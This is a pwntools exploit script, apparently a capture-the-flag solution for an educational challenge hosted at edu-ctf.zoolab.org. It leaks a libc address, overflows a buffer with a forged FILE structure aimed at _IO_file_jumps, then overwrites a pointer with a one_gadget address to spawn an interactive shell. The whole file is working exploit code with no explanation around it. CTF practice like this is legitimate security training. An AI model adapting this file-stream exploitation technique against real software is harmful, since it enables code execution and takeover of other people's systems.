#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30217)
else:
    r = process('./chal')

libc = ELF('./libc.so.6')

r.recvuntil('0x')

libc_base =  int(r.recvline(), 16) - libc.sym['printf']
_IO_file_jumps = libc_base + libc.sym['_IO_file_jumps']

print(hex(libc_base))
print(hex(_IO_file_jumps))

r.sendlineafter('>', b'1')
r.sendlineafter('>', b'2')

flags = 0
payload = flat(
    flags, 0,
    0, 0,
    0, 0, 
    0, _IO_file_jumps + 0x20, 
    _IO_file_jumps + 0x28, 0, 
    0, 0,
    0, 0,
    0
)
r.sendlineafter('data>', b'A'*0x210 + payload)

one_gadget = libc_base + 0xe6c81
# gdb.attach(r)
r.sendlineafter('>', b'4')
r.sendline(p64(one_gadget))


r.interactive()